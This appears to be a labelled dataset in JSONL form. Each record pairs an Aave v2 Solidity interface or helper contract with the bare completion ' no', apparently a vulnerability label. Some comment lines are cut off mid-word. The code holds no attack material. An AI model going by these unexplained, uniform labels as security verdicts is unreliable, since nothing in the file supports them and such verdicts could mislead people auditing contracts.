{"prompt": "pragma solidity 0.6.12; \npragma experimental ABIEncoderV2; \n \nimport {StableDebtToken} from '../protocol/tokenization/StableDebtToken.sol'; \nimport {VariableDebtToken} from '../protocol/tokenization/VariableDebtToken.sol'; \nimport {LendingRateOracle} from '../mocks/oracle/LendingRateOracle.sol'; \nimport {Ownable} from '../dependencies/openzeppelin/contracts/Ownable.sol'; \nimport {StringLib} from './StringLib.sol'; \n \ncontract StableAndVariableTokensHelper is Ownable { \n address payable private pool; \n address private addressesProvider; \n event deployedContracts(address stableToken, address variableToken); \n \n constructor(address payable _pool, address _addressesProvider) public { \n pool = _pool; \n addressesProvider = _addressesProvider; \n } \n \n function initDeployment(address[] calldata tokens, string[] calldata symbols) external onlyOwner { \n require(tokens.length == symbols.length, 'Arrays not same length'); \n require(pool != address(0), 'Pool can not be zero address'); \n for (uint256 i = 0; i < tokens.length; i++) { \n emit deployedContracts(address(new StableDebtToken()), address(new VariableDebtToken())); \n } \n } \n \n function setOracleBorrowRates( \n address[] calldata assets, \n uint256[] calldata rates, \n address oracle \n ) external onlyOwner { \n require(assets.length == rates.length, 'Arrays not same length'); \n \n for (uint256 i = 0; i < assets.length; i++) { \n // LendingRateOracle owner must be this contract \n LendingRateOracle(oracle).setMarketBorrowRate(assets[i], rates[i]); \n } \n } \n \n function setOracleOwnership(address oracle, address admin) external onlyOwner { \n require(admin != address(0), 'owner can not be zero'); \n require(LendingRateOracle(oracle).owner() == address(this), 'helper is not owner'); \n LendingRateOracle(oracle).transferOwnership(admin); \n } \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \nlibrary StringLib { \n function concat(string memory a, string memory b) internal pure returns (string memory) { \n return string(abi.encodePacked(a, b)); \n } \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \npragma experimental ABIEncoderV2; \n \nimport {LendingPool} from '../protocol/lendingpool/LendingPool.sol'; \nimport { \n LendingPoolAddressesProvider \n} from '../protocol/configuration/LendingPoolAddressesProvider.sol'; \nimport {LendingPoolConfigurator} from '../protocol/lendingpool/LendingPoolConfigurator.sol'; \nimport {AToken} from '../protocol/tokenization/AToken.sol'; \nimport { \n DefaultReserveInterestRateStrategy \n} from '../protocol/lendingpool/DefaultReserveInterestRateStrategy.sol'; \nimport {Ownable} from '../dependencies/openzeppelin/contracts/Ownable.sol'; \nimport {StringLib} from './StringLib.sol'; \n \ncontract ATokensAndRatesHelper is Ownable { \n address payable private pool; \n address private addressesProvider; \n address private poolConfigurator; \n event deployedContracts(address aToken, address strategy); \n \n struct InitDeploymentInput { \n address asset; \n uint256[6] rates; \n } \n \n struct ConfigureReserveInput { \n address asset; \n uint256 baseLTV; \n uint256 liquidationThreshold; \n uint256 liquidationBonus; \n uint256 reserveFactor; \n bool stableBorrowingEnabled; \n } \n \n constructor( \n address payable _pool, \n address _addressesProvider, \n address _poolConfigurator \n ) public { \n pool = _pool; \n addressesProvider = _addressesProvider; \n poolConfigurator = _poolConfigurator; \n } \n \n function initDeployment(InitDeploymentInput[] calldata inputParams) external onlyOwner { \n for (uint256 i = 0; i < inputParams.length; i++) { \n emit deployedContracts( \n address(new AToken()), \n address( \n new DefaultReserveInterestRateStrategy( \n LendingPoolAddressesProvider(addressesProvider), \n inputParams[i].rates[0], \n inputParams[i].rates[1], \n inputParams[i].rates[2], \n inputParams[i].rates[3], \n inputParams[i].rates[4], \n inputParams[i].rates[5] \n ) \n ) \n ); \n } \n } \n \n function configureReserves(ConfigureReserveInput[] calldata inputParams) external onlyOwner { \n LendingPoolConfigurator configurator = LendingPoolConfigurator(poolConfigurator); \n for (uint256 i = 0; i < inputParams.length; i++) { \n configurator.configureReserveAsCollateral( \n inputParams[i].asset, \n inputParams[i].baseLTV, \n inputParams[i].liquidationThreshold, \n inputParams[i].liquidationBonus \n ); \n \n configurator.enableBorrowingOnReserve( \n inputParams[i].asset, \n inputParams[i].stableBorrowingEnabled \n ); \n configurator.setReserveFactor(inputParams[i].asset, inputParams[i].reserveFactor); \n } \n } \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \nimport {IERC20} from '../dependencies/openzeppelin/contracts/IERC20.sol'; \nimport {IScaledBalanceToken} from './IScaledBalanceToken.sol'; \nimport {IInitializableAToken} from './IInitializableAToken.sol'; \nimport {IAaveIncentivesController} from './IAaveIncentivesController.sol'; \n \ninterface IAToken is IERC20, IScaledBalanceToken, IInitializableAToken { \n /** \n * @dev Emitted after the mint action \n * @param from The address performing the mint \n * @param value The amount being \n * @param index The new liquidity index of the reserve \n **/ \n event Mint(address indexed from, uint256 value, uint256 index); \n \n /** \n * @dev Mints `amount` aTokens to `user` \n * @param user The address receiving the minted tokens \n * @param amount The amount of tokens getting minted \n * @param index The new liquidity index of the reserve \n * @return `true` if the the previous balance of the user was 0 \n */ \n function mint( \n address user, \n uint256 amount, \n uint256 index \n ) external returns (bool); \n \n /** \n * @dev Emitted after aTokens are burned \n * @param from The owner of the aTokens, getting them burned \n * @param target The address that will receive the underlying \n * @param value The amount being burned \n * @param index The new liquidity index of the reserve \n **/ \n event Burn(address indexed from, address indexed target, uint256 value, uint256 index); \n \n /** \n * @dev Emitted during the transfer action \n * @param from The user whose tokens are being transferred \n * @param to The recipient \n * @param value The amount being transferred \n * @param index The new liquidity index of the reserve \n **/ \n event BalanceTransfer(address indexed from, address indexed to, uint256 value, uint256 index); \n \n /** \n * @dev Burns aTokens from `user` and sends the equivalent amount of underlying to `receiverOfUnder\n * @param user The owner of the aTokens, getting them burned \n * @param receiverOfUnderlying The address that will receive the underlying \n * @param amount The amount being burned \n * @param index The new liquidity index of the reserve \n **/ \n function burn( \n address user, \n address receiverOfUnderlying, \n uint256 amount, \n uint256 index \n ) external; \n \n /** \n * @dev Mints aTokens to the reserve treasury \n * @param amount The amount of tokens getting minted \n * @param index The new liquidity index of the reserve \n */ \n function mintToTreasury(uint256 amount, uint256 index) external; \n \n /** \n * @dev Transfers aTokens in the event of a borrow being liquidated, in case the liquidators reclai\n * @param from The address getting liquidated, current owner of the aTokens \n * @param to The recipient \n * @param value The amount of tokens getting transferred \n **/ \n function transferOnLiquidation( \n address from, \n address to, \n uint256 value \n ) external; \n \n /** \n * @dev Transfers the underlying asset to `target`. Used by the LendingPool to transfer \n * assets in borrow(), withdraw() and flashLoan() \n * @param user The recipient of the underlying \n * @param amount The amount getting transferred \n * @return The amount transferred \n **/ \n function transferUnderlyingTo(address user, uint256 amount) external returns (uint256); \n \n /** \n * @dev Invoked to execute actions on the aToken side after a repayment. \n * @param user The user executing the repayment \n * @param amount The amount getting repaid \n **/ \n function handleRepayment(address user, uint256 amount) external; \n \n /** \n * @dev Returns the address of the incentives controller contract \n **/ \n function getIncentivesController() external view returns (IAaveIncentivesController); \n \n /** \n * @dev Returns the address of the underlying asset of this aToken (E.g. WETH for aWETH) \n **/ \n function UNDERLYING_ASSET_ADDRESS() external view returns (address); \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \nimport {IScaledBalanceToken} from './IScaledBalanceToken.sol'; \nimport {IInitializableDebtToken} from './IInitializableDebtToken.sol'; \nimport {IAaveIncentivesController} from './IAaveIncentivesController.sol'; \n \n/** \n * @title IStableDebtToken \n * @notice Defines the interface for the stable debt token \n * @dev It does not inherit from IERC20 to save in code size \n * @author Aave \n **/ \n \ninterface IStableDebtToken is IScaledBalanceToken,IInitializableDebtToken { \n /** \n * @dev Emitted when new stable debt is minted \n * @param user The address of the user who triggered the minting \n * @param onBehalfOf The recipient of stable debt tokens \n * @param amount The amount minted \n * @param currentBalance The current balance of the user \n * @param balanceIncrease The increase in balance since the last action of the user \n * @param newRate The rate of the debt after the minting \n * @param avgStableRate The new average stable rate after the minting \n * @param newTotalSupply The new total supply of the stable debt token after the action \n **/ \n event Mint( \n address indexed user, \n address indexed onBehalfOf, \n uint256 amount, \n uint256 currentBalance, \n uint256 balanceIncrease, \n uint256 newRate, \n uint256 avgStableRate, \n uint256 newTotalSupply \n ); \n \n /** \n * @dev Emitted when new stable debt is burned \n * @param user The address of the user \n * @param amount The amount being burned \n * @param currentBalance The current balance of the user \n * @param balanceIncrease The the increase in balance since the last action of the user \n * @param avgStableRate The new average stable rate after the burning \n * @param newTotalSupply The new total supply of the stable debt token after the action \n **/ \n event Burn( \n address indexed user, \n uint256 amount, \n uint256 currentBalance, \n uint256 balanceIncrease, \n uint256 avgStableRate, \n uint256 newTotalSupply \n ); \n \n /** \n * @dev Mints debt token to the `onBehalfOf` address. \n * - The resulting rate is the weighted average between the rate of the new debt \n * and the rate of the previous debt \n * @param user The address receiving the borrowed underlying, being the delegatee in case \n * of credit delegate, or same as `onBehalfOf` otherwise \n * @param onBehalfOf The address receiving the debt tokens \n * @param amount The amount of debt tokens to mint \n * @param rate The rate of the debt being minted \n **/ \n function mint( \n address user, \n address onBehalfOf, \n uint256 amount, \n uint256 rate \n ) external returns (bool); \n \n /** \n * @dev Burns debt of `user` \n * - The resulting rate is the weighted average between the rate of the new debt \n * and the rate of the previous debt \n * @param user The address of the user getting his debt burned \n * @param amount The amount of debt tokens getting burned \n **/ \n function burn(address user, uint256 amount) external; \n \n /** \n * @dev Returns the average rate of all the stable rate loans. \n * @return The average stable rate \n **/ \n function getAverageStableRate() external view returns (uint256); \n \n /** \n * @dev Returns the stable rate of the user debt \n * @return The stable rate of the user \n **/ \n function getUserStableRate(address user) external view returns (uint256); \n \n /** \n * @dev Returns the timestamp of the last update of the user \n * @return The timestamp \n **/ \n function getUserLastUpdated(address user) external view returns (uint40); \n \n /** \n * @dev Returns the principal, the total supply and the average stable rate \n **/ \n function getSupplyData() \n external \n view \n returns ( \n uint256, \n uint256, \n uint256, \n uint40 \n ); \n \n /** \n * @dev Returns the timestamp of the last update of the total supply \n * @return The timestamp \n **/ \n function getTotalSupplyLastUpdated() external view returns (uint40); \n \n /** \n * @dev Returns the total supply and the average stable rate \n **/ \n function getTotalSupplyAndAvgRate() external view returns (uint256, uint256); \n \n /** \n * @dev Returns the principal debt balance of the user \n * @return The debt balance of the user since the last burn/mint action \n **/ \n function principalBalanceOf(address user) external view returns (uint256); \n \n /** \n * @dev Returns the address of the incentives controller contract \n **/ \n function getIncentivesController() external view returns (IAaveIncentivesController); \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \npragma experimental ABIEncoderV2; \n \ninterface ILendingPoolConfigurator { \n struct InitReserveInput { \n address aTokenImpl; \n address stableDebtTokenImpl; \n address variableDebtTokenImpl; \n uint8 underlyingAssetDecimals; \n address interestRateStrategyAddress; \n address underlyingAsset; \n address treasury; \n address incentivesController; \n string underlyingAssetName; \n string aTokenName; \n string aTokenSymbol; \n string variableDebtTokenName; \n string variableDebtTokenSymbol; \n string stableDebtTokenName; \n string stableDebtTokenSymbol; \n bytes params; \n } \n \n struct UpdateATokenInput { \n address asset; \n address treasury; \n address incentivesController; \n string name; \n string symbol; \n address implementation; \n bytes params; \n } \n \n struct UpdateDebtTokenInput { \n address asset; \n address incentivesController; \n string name; \n string symbol; \n address implementation; \n bytes params; \n } \n \n /** \n * @dev Emitted when a reserve is initialized. \n * @param asset The address of the underlying asset of the reserve \n * @param aToken The address of the associated aToken contract \n * @param stableDebtToken The address of the associated stable rate debt token \n * @param variableDebtToken The address of the associated variable rate debt token \n * @param interestRateStrategyAddress The address of the interest rate strategy for the reserve \n **/ \n event ReserveInitialized( \n address indexed asset, \n address indexed aToken, \n address stableDebtToken, \n address variableDebtToken, \n address interestRateStrategyAddress \n ); \n \n /** \n * @dev Emitted when borrowing is enabled on a reserve \n * @param asset The address of the underlying asset of the reserve \n * @param stableRateEnabled True if stable rate borrowing is enabled, false otherwise \n **/ \n event BorrowingEnabledOnReserve(address indexed asset, bool stableRateEnabled); \n \n /** \n * @dev Emitted when borrowing is disabled on a reserve \n * @param asset The address of the underlying asset of the reserve \n **/ \n event BorrowingDisabledOnReserve(address indexed asset); \n \n /** \n * @dev Emitted when the collateralization risk parameters for the specified asset are updated. \n * @param asset The address of the underlying asset of the reserve \n * @param ltv The loan to value of the asset when used as collateral \n * @param liquidationThreshold The threshold at which loans using this asset as collateral will be \n * @param liquidationBonus The bonus liquidators receive to liquidate this asset \n **/ \n event CollateralConfigurationChanged( \n address indexed asset, \n uint256 ltv, \n uint256 liquidationThreshold, \n uint256 liquidationBonus \n ); \n \n /** \n * @dev Emitted when stable rate borrowing is enabled on a reserve \n * @param asset The address of the underlying asset of the reserve \n **/ \n event StableRateEnabledOnReserve(address indexed asset); \n \n /** \n * @dev Emitted when stable rate borrowing is disabled on a reserve \n * @param asset The address of the underlying asset of the reserve \n **/ \n event StableRateDisabledOnReserve(address indexed asset); \n \n /** \n * @dev Emitted when a reserve is activated \n * @param asset The address of the underlying asset of the reserve \n **/ \n event ReserveActivated(address indexed asset); \n \n /** \n * @dev Emitted when a reserve is deactivated \n * @param asset The address of the underlying asset of the reserve \n **/ \n event ReserveDeactivated(address indexed asset); \n \n /** \n * @dev Emitted when a reserve is frozen \n * @param asset The address of the underlying asset of the reserve \n **/ \n event ReserveFrozen(address indexed asset); \n \n /** \n * @dev Emitted when a reserve is unfrozen \n * @param asset The address of the underlying asset of the reserve \n **/ \n event ReserveUnfrozen(address indexed asset); \n \n /** \n * @dev Emitted when a reserve factor is updated \n * @param asset The address of the underlying asset of the reserve \n * @param factor The new reserve factor \n **/ \n event ReserveFactorChanged(address indexed asset, uint256 factor); \n \n /** \n * @dev Emitted when the reserve decimals are updated \n * @param asset The address of the underlying asset of the reserve \n * @param decimals The new decimals \n **/ \n event ReserveDecimalsChanged(address indexed asset, uint256 decimals); \n \n /** \n * @dev Emitted when a reserve interest strategy contract is updated \n * @param asset The address of the underlying asset of the reserve \n * @param strategy The new address of the interest strategy contract \n **/ \n event ReserveInterestRateStrategyChanged(address indexed asset, address strategy); \n \n /** \n * @dev Emitted when an aToken implementation is upgraded \n * @param asset The address of the underlying asset of the reserve \n * @param proxy The aToken proxy address \n * @param implementation The new aToken implementation \n **/ \n event ATokenUpgraded( \n address indexed asset, \n address indexed proxy, \n address indexed implementation \n ); \n \n /** \n * @dev Emitted when the implementation of a stable debt token is upgraded \n * @param asset The address of the underlying asset of the reserve \n * @param proxy The stable debt token proxy address \n * @param implementation The new aToken implementation \n **/ \n event StableDebtTokenUpgraded( \n address indexed asset, \n address indexed proxy, \n address indexed implementation \n ); \n \n /** \n * @dev Emitted when the implementation of a variable debt token is upgraded \n * @param asset The address of the underlying asset of the reserve \n * @param proxy The variable debt token proxy address \n * @param implementation The new aToken implementation \n **/ \n event VariableDebtTokenUpgraded( \n address indexed asset, \n address indexed proxy, \n address indexed implementation \n ); \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \n/** \n * @title LendingPoolAddressesProviderRegistry contract \n * @dev Main registry of LendingPoolAddressesProvider of multiple Aave protocol's markets \n * - Used for indexing purposes of Aave protocol's markets \n * - The id assigned to a LendingPoolAddressesProvider refers to the market it is connected with, \n * for example with `0` for the Aave main market and `1` for the next created \n * @author Aave \n **/ \ninterface ILendingPoolAddressesProviderRegistry { \n event AddressesProviderRegistered(address indexed newAddress); \n event AddressesProviderUnregistered(address indexed newAddress); \n \n function getAddressesProvidersList() external view returns (address[] memory); \n \n function getAddressesProviderIdByAddress(address addressesProvider) \n external \n view \n returns (uint256); \n \n function registerAddressesProvider(address provider, uint256 id) external; \n \n function unregisterAddressesProvider(address provider) external; \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \nimport {IERC20} from '../dependencies/openzeppelin/contracts/IERC20.sol'; \n \ninterface IExchangeAdapter { \n event Exchange( \n address indexed from, \n address indexed to, \n address indexed platform, \n uint256 fromAmount, \n uint256 toAmount \n ); \n \n function approveExchange(IERC20[] calldata tokens) external; \n \n function exchange( \n address from, \n address to, \n uint256 amount, \n uint256 maxSlippage \n ) external returns (uint256); \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \n/** \n * @title IPriceOracleGetter interface \n * @notice Interface for the Aave price oracle. \n **/ \n \ninterface IPriceOracleGetter { \n /** \n * @dev returns the asset price in ETH \n * @param asset the address of the asset \n * @return the ETH price of the asset \n **/ \n function getAssetPrice(address asset) external view returns (uint256); \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \nimport {ILendingPool} from './ILendingPool.sol'; \nimport {IAaveIncentivesController} from './IAaveIncentivesController.sol'; \n \n/** \n * @title IInitializableAToken \n * @notice Interface for the initialize function on AToken \n * @author Aave \n **/ \ninterface IInitializableAToken { \n /** \n * @dev Emitted when an aToken is initialized \n * @param underlyingAsset The address of the underlying asset \n * @param pool The address of the associated lending pool \n * @param treasury The address of the treasury \n * @param incentivesController The address of the incentives controller for this aToken \n * @param aTokenDecimals the decimals of the underlying \n * @param aTokenName the name of the aToken \n * @param aTokenSymbol the symbol of the aToken \n * @param params A set of encoded parameters for additional initialization \n **/ \n event Initialized( \n address indexed underlyingAsset, \n address indexed pool, \n address treasury, \n address incentivesController, \n uint8 aTokenDecimals, \n string aTokenName, \n string aTokenSymbol, \n bytes params \n ); \n \n /** \n * @dev Initializes the aToken \n * @param pool The address of the lending pool where this aToken will be used \n * @param treasury The address of the Aave treasury, receiving the fees on this aToken \n * @param underlyingAsset The address of the underlying asset of this aToken (E.g. WETH for aWETH) \n * @param incentivesController The smart contract managing potential incentives distribution \n * @param aTokenDecimals The decimals of the aToken, same as the underlying asset's \n * @param aTokenName The name of the aToken \n * @param aTokenSymbol The symbol of the aToken \n */ \n function initialize( \n ILendingPool pool, \n address treasury, \n address underlyingAsset, \n IAaveIncentivesController incentivesController, \n uint8 aTokenDecimals, \n string calldata aTokenName, \n string calldata aTokenSymbol, \n bytes calldata params \n ) external; \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \ninterface ICreditDelegationToken { \n event BorrowAllowanceDelegated( \n address indexed fromUser, \n address indexed toUser, \n address asset, \n uint256 amount \n ); \n \n /** \n * @dev delegates borrowing power to a user on the specific debt token \n * @param delegatee the address receiving the delegated borrowing power \n * @param amount the maximum amount being delegated. Delegation will still \n * respect the liquidation constraints (even if delegated, a delegatee cannot \n * force a delegator HF to go below 1) \n **/ \n function approveDelegation(address delegatee, uint256 amount) external; \n \n /** \n * @dev returns the borrow allowance of the user \n * @param fromUser The user to giving allowance \n * @param toUser The user to give allowance to \n * @return the current allowance of toUser \n **/ \n function borrowAllowance(address fromUser, address toUser) external view returns (uint256); \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \n/************ \n@title IPriceOracle interface \n@notice Interface for the Aave price oracle.*/ \ninterface IPriceOracle { \n /*********** \n @dev returns the asset price in ETH \n */ \n function getAssetPrice(address asset) external view returns (uint256); \n \n /*********** \n @dev sets the asset price, in wei \n */ \n function setAssetPrice(address asset, uint256 price) external; \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \ninterface IUniswapV2Router02 { \n function swapExactTokensForTokens( \n uint256 amountIn, \n uint256 amountOutMin, \n address[] calldata path, \n address to, \n uint256 deadline \n ) external returns (uint256[] memory amounts); \n \n function swapTokensForExactTokens( \n uint256 amountOut, \n uint256 amountInMax, \n address[] calldata path, \n address to, \n uint256 deadline \n ) external returns (uint256[] memory amounts); \n \n function getAmountsOut(uint256 amountIn, address[] calldata path) \n external \n view \n returns (uint256[] memory amounts); \n \n function getAmountsIn(uint256 amountOut, address[] calldata path) \n external \n view \n returns (uint256[] memory amounts); \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \n/** \n * @title LendingPoolAddressesProvider contract \n * @dev Main registry of addresses part of or connected to the protocol, including permissioned roles\n * - Acting also as factory of proxies and admin of those, so with right to change its implementation\n * - Owned by the Aave Governance \n * @author Aave \n **/ \ninterface ILendingPoolAddressesProvider { \n event MarketIdSet(string newMarketId); \n event LendingPoolUpdated(address indexed newAddress); \n event ConfigurationAdminUpdated(address indexed newAddress); \n event EmergencyAdminUpdated(address indexed newAddress); \n event LendingPoolConfiguratorUpdated(address indexed newAddress); \n event LendingPoolCollateralManagerUpdated(address indexed newAddress); \n event PriceOracleUpdated(address indexed newAddress); \n event LendingRateOracleUpdated(address indexed newAddress); \n event ProxyCreated(bytes32 id, address indexed newAddress); \n event AddressSet(bytes32 id, address indexed newAddress, bool hasProxy); \n \n function getMarketId() external view returns (string memory); \n \n function setMarketId(string calldata marketId) external; \n \n function setAddress(bytes32 id, address newAddress) external; \n \n function setAddressAsProxy(bytes32 id, address impl) external; \n \n function getAddress(bytes32 id) external view returns (address); \n \n function getLendingPool() external view returns (address); \n \n function setLendingPoolImpl(address pool) external; \n \n function getLendingPoolConfigurator() external view returns (address); \n \n function setLendingPoolConfiguratorImpl(address configurator) external; \n \n function getLendingPoolCollateralManager() external view returns (address); \n \n function setLendingPoolCollateralManager(address manager) external; \n \n function getPoolAdmin() external view returns (address); \n \n function setPoolAdmin(address admin) external; \n \n function getEmergencyAdmin() external view returns (address); \n \n function setEmergencyAdmin(address admin) external; \n \n function getPriceOracle() external view returns (address); \n \n function setPriceOracle(address priceOracle) external; \n \n function getLendingRateOracle() external view returns (address); \n \n function setLendingRateOracle(address lendingRateOracle) external; \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \npragma experimental ABIEncoderV2; \n \ninterface IAaveIncentivesController { \n function handleAction( \n address user, \n uint256 userBalance, \n uint256 totalSupply \n ) external; \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \n/** \n * @title IDelegationToken \n * @dev Implements an interface for tokens with delegation COMP/UNI compatible \n * @author Aave \n **/ \ninterface IDelegationToken { \n function delegate(address delegatee) external; \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \n/** \n * @title IReserveInterestRateStrategyInterface interface \n * @dev Interface for the calculation of the interest rates \n * @author Aave \n */ \ninterface IReserveInterestRateStrategy { \n function baseVariableBorrowRate() external view returns (uint256); \n \n function getMaxVariableBorrowRate() external view returns (uint256); \n \n function calculateInterestRates( \n address reserve, \n uint256 availableLiquidity, \n uint256 totalStableDebt, \n uint256 totalVariableDebt, \n uint256 averageStableBorrowRate, \n uint256 reserveFactor \n ) \n external \n view \n returns ( \n uint256, \n uint256, \n uint256 \n ); \n \n function calculateInterestRates( \n address reserve, \n address aToken, \n uint256 liquidityAdded, \n uint256 liquidityTaken, \n uint256 totalStableDebt, \n uint256 totalVariableDebt, \n uint256 averageStableBorrowRate, \n uint256 reserveFactor \n ) \n external \n view \n returns ( \n uint256 liquidityRate, \n uint256 stableBorrowRate, \n uint256 variableBorrowRate \n ); \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \ninterface IUniswapExchange { \n event TokenPurchase( \n address indexed buyer, \n uint256 indexed eth_sold, \n uint256 indexed tokens_bought \n ); \n event EthPurchase(address indexed buyer, uint256 indexed tokens_sold, uint256 indexed eth_bought); \n event AddLiquidity( \n address indexed provider, \n uint256 indexed eth_amount, \n uint256 indexed token_amount \n ); \n event RemoveLiquidity( \n address indexed provider, \n uint256 indexed eth_amount, \n uint256 indexed token_amount \n ); \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \n/** \n * @title ILendingPoolCollateralManager \n * @author Aave \n * @notice Defines the actions involving management of collateral in the protocol. \n **/ \ninterface ILendingPoolCollateralManager { \n /** \n * @dev Emitted when a borrower is liquidated \n * @param collateral The address of the collateral being liquidated \n * @param principal The address of the reserve \n * @param user The address of the user being liquidated \n * @param debtToCover The total amount liquidated \n * @param liquidatedCollateralAmount The amount of collateral being liquidated \n * @param liquidator The address of the liquidator \n * @param receiveAToken true if the liquidator wants to receive aTokens, false otherwise \n **/ \n event LiquidationCall( \n address indexed collateral, \n address indexed principal, \n address indexed user, \n uint256 debtToCover, \n uint256 liquidatedCollateralAmount, \n address liquidator, \n bool receiveAToken \n ); \n \n /** \n * @dev Emitted when a reserve is disabled as collateral for an user \n * @param reserve The address of the reserve \n * @param user The address of the user \n **/ \n event ReserveUsedAsCollateralDisabled(address indexed reserve, address indexed user); \n \n /** \n * @dev Emitted when a reserve is enabled as collateral for an user \n * @param reserve The address of the reserve \n * @param user The address of the user \n **/ \n event ReserveUsedAsCollateralEnabled(address indexed reserve, address indexed user); \n \n /** \n * @dev Users can invoke this function to liquidate an undercollateralized position. \n * @param collateral The address of the collateral to liquidated \n * @param principal The address of the principal reserve \n * @param user The address of the borrower \n * @param debtToCover The amount of principal that the liquidator wants to repay \n * @param receiveAToken true if the liquidators wants to receive the aTokens, false if \n * he wants to receive the underlying asset directly \n **/ \n function liquidationCall( \n address collateral, \n address principal, \n address user, \n uint256 debtToCover, \n bool receiveAToken \n ) external returns (uint256, string memory); \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \n/** \n * @title ILendingRateOracle interface \n * @notice Interface for the Aave borrow rate oracle. Provides the average market borrow rate to be u\n **/ \n \ninterface ILendingRateOracle { \n /** \n @dev returns the market borrow rate in ray \n **/ \n function getMarketBorrowRate(address asset) external view returns (uint256); \n \n /** \n @dev sets the market borrow rate. Rate value must be in ray \n **/ \n function setMarketBorrowRate(address asset, uint256 rate) external; \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \nimport {IScaledBalanceToken} from './IScaledBalanceToken.sol'; \nimport {IInitializableDebtToken} from './IInitializableDebtToken.sol'; \nimport {IAaveIncentivesController} from './IAaveIncentivesController.sol'; \n \n/** \n * @title IVariableDebtToken \n * @author Aave \n * @notice Defines the basic interface for a variable debt token. \n **/ \ninterface IVariableDebtToken is IScaledBalanceToken, IInitializableDebtToken { \n /** \n * @dev Emitted after the mint action \n * @param from The address performing the mint \n * @param onBehalfOf The address of the user on which behalf minting has been performed \n * @param value The amount to be minted \n * @param index The last index of the reserve \n **/ \n event Mint(address indexed from, address indexed onBehalfOf, uint256 value, uint256 index); \n \n /** \n * @dev Mints debt token to the `onBehalfOf` address \n * @param user The address receiving the borrowed underlying, being the delegatee in case \n * of credit delegate, or same as `onBehalfOf` otherwise \n * @param onBehalfOf The address receiving the debt tokens \n * @param amount The amount of debt being minted \n * @param index The variable debt index of the reserve \n * @return `true` if the the previous balance of the user is 0 \n **/ \n function mint( \n address user, \n address onBehalfOf, \n uint256 amount, \n uint256 index \n ) external returns (bool); \n \n /** \n * @dev Emitted when variable debt is burnt \n * @param user The user which debt has been burned \n * @param amount The amount of debt being burned \n * @param index The index of the user \n **/ \n event Burn(address indexed user, uint256 amount, uint256 index); \n \n /** \n * @dev Burns user variable debt \n * @param user The user which debt is burnt \n * @param index The variable debt index of the reserve \n **/ \n function burn( \n address user, \n uint256 amount, \n uint256 index \n ) external; \n \n /** \n * @dev Returns the address of the incentives controller contract \n **/ \n function getIncentivesController() external view returns (IAaveIncentivesController); \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \nimport {ILendingPool} from './ILendingPool.sol'; \nimport {IAaveIncentivesController} from './IAaveIncentivesController.sol'; \n \n/** \n * @title IInitializableDebtToken \n * @notice Interface for the initialize function common between debt tokens \n * @author Aave \n **/ \ninterface IInitializableDebtToken { \n /** \n * @dev Emitted when a debt token is initialized \n * @param underlyingAsset The address of the underlying asset \n * @param pool The address of the associated lending pool \n * @param incentivesController The address of the incentives controller for this aToken \n * @param debtTokenDecimals the decimals of the debt token \n * @param debtTokenName the name of the debt token \n * @param debtTokenSymbol the symbol of the debt token \n * @param params A set of encoded parameters for additional initialization \n **/ \n event Initialized( \n address indexed underlyingAsset, \n address indexed pool, \n address incentivesController, \n uint8 debtTokenDecimals, \n string debtTokenName, \n string debtTokenSymbol, \n bytes params \n ); \n \n /** \n * @dev Initializes the debt token. \n * @param pool The address of the lending pool where this aToken will be used \n * @param underlyingAsset The address of the underlying asset of this aToken (E.g. WETH for aWETH) \n * @param incentivesController The smart contract managing potential incentives distribution \n * @param debtTokenDecimals The decimals of the debtToken, same as the underlying asset's \n * @param debtTokenName The name of the token \n * @param debtTokenSymbol The symbol of the token \n */ \n function initialize( \n ILendingPool pool, \n address underlyingAsset, \n IAaveIncentivesController incentivesController, \n uint8 debtTokenDecimals, \n string memory debtTokenName, \n string memory debtTokenSymbol, \n bytes calldata params \n ) external; \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \ninterface IChainlinkAggregator { \n function latestAnswer() external view returns (int256); \n \n function latestTimestamp() external view returns (uint256); \n \n function latestRound() external view returns (uint256); \n \n function getAnswer(uint256 roundId) external view returns (int256); \n \n function getTimestamp(uint256 roundId) external view returns (uint256); \n \n event AnswerUpdated(int256 indexed current, uint256 indexed roundId, uint256 timestamp); \n event NewRound(uint256 indexed roundId, address indexed startedBy); \n} \n\n\n###\n\n", "completion": " no###\n###"}
